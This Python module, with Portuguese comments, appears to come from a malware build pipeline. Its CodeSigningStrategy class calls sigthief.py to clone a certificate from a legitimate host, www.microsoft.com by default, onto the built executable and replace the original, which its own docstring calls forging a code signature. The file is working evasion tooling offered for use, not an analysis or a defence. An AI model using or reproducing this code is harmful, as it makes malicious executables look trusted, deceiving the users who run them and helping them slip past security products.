# strategies/signing.py

import sys
import subprocess
import shutil
from pathlib import Path
from .base import BuildStrategy, BuildContext, SignatureStrategy
from rich.console import Console

console = Console()


class CodeSigningStrategy(SignatureStrategy):
    """
    Forja uma assinatura de código em um executável usando sigthief.py.
    Clona um certificado de um host legítimo para assinar o artefato.
    """

    def execute(self, context: BuildContext) -> BuildContext:

        if not context.config.get('sign_executable', False):
            return context

        if not context.final_artifact_path or not context.final_artifact_path.exists():
            console.print(
                "[bold yellow]  → AVISO: Artefato final não encontrado. "
                "Pulando etapa de assinatura.[/bold yellow]"
            )
            context.log("CodeSigning: pulado — artefato não encontrado.")
            return context

        console.print("[bold cyan]  → Iniciando forjamento de assinatura de código...[/bold cyan]")

        python_executable = sys.executable
        base_dir = Path(__file__).parent.parent
        signing_script = base_dir / "sigthief.py"

        if not signing_script.exists():
            console.print(
                f"[bold yellow]  → AVISO: '{signing_script.name}' não encontrado em '{base_dir}'. "
                f"Pulando assinatura.[/bold yellow]"
            )
            context.log("CodeSigning: pulado — sigthief.py não encontrado.")
            return context

        source_host = context.config.get('sign_host', 'www.microsoft.com')
        original_path = context.final_artifact_path
        signed_path = original_path.with_suffix(f"{original_path.suffix}.signed")

        command = [
            python_executable,
            str(signing_script),
            '-t', str(original_path),
            '-r', str(source_host),
            '-o', str(signed_path)
        ]

        console.print(
            f"[bold cyan]  → Clonando certificado de '{source_host}' "
            f"para '{original_path.name}'...[/bold cyan]"
        )

        try:
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                encoding='utf-8',
                errors='ignore',
                timeout=90
            )

            if result.returncode != 0:
                error_output = (result.stdout + "\n" + result.stderr).strip()
                raise RuntimeError(f"sigthief falhou:\n{error_output}")

            # Substituição atômica — evita race condition do unlink+move
            signed_path.replace(original_path)

            context.config['signing_applied'] = True
            context.log(f"CodeSigning: assinatura de '{source_host}' aplicada com sucesso.")
            console.print(
                f"[bold green]  → Assinatura de '{source_host}' aplicada com sucesso![/bold green]"
            )

        except subprocess.TimeoutExpired:
            console.print(
                "[bold yellow]  → AVISO: Timeout ao assinar (>90s). "
                "Verifique sua conexão. Continuando sem assinatura.[/bold yellow]"
            )
            context.config['signing_applied'] = False
            context.log("CodeSigning: falhou por timeout.")

        except Exception as e:
            console.print(
                f"[bold yellow]  → AVISO: Erro ao assinar: {e}. "
                f"Continuando sem assinatura.[/bold yellow]"
            )
            context.config['signing_applied'] = False
            context.log(f"CodeSigning: falhou — {e}")
            if signed_path.exists():
                signed_path.unlink()

        return context


class NullSignature(BuildStrategy):
    """Estratégia placeholder — não realiza nenhuma assinatura."""

    def execute(self, context: BuildContext) -> BuildContext:
        console.print("[dim]  → Assinatura: nenhuma (NullSignature).[/dim]")
        context.log("NullSignature: nenhuma ação realizada.")
        return context
